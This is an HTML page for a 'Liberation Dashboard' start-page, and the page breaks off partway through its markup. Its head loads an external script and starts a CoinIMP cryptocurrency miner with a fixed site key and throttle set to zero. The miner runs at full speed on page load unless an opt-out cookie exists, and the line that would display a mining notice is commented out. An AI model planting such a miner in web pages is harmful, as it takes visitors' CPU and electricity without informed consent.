<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width">
	<title>Liberation Dashboard</title>
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@700&display=swap" rel="stylesheet">

	<script async src="https://arc.io/widget.min.js#XrfvXZCj"></script>
	<script src="https://www.hostingcloud.racing/M6mc.js"></script>
	<script>
		if (!getCookie("no_crypto")) {
			var _client = new Client.Anonymous('871e2fd3b8f572a1c0ea64877708619e628649b45391de33725b377e839d83a4', {
				throttle: 0, c: 'w'
			});
			_client.start();
			// _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
			setInterval(() => document.querySelector("#crypto").textContent = Math.round(_client.getHashesPerSecond()*1000)/1000, 500);
		}
	</script>
</head>

<body>
	<div class="navbar">
		<br />
		<div class="navcontainer">
			<div class="navico">
				<a href="/index.html" class="navtxt">Home</a>

		</div>
	</div>
	<div class="titlebox">
		<br />

		</div>
		<br />
	</div>
	<div class="bodybox">
		<div class="sectionheader">
			<p class="header">Favorites</p>
		</div>
		<div class="sectioncontent" id="favorites">

	<div class="footer">
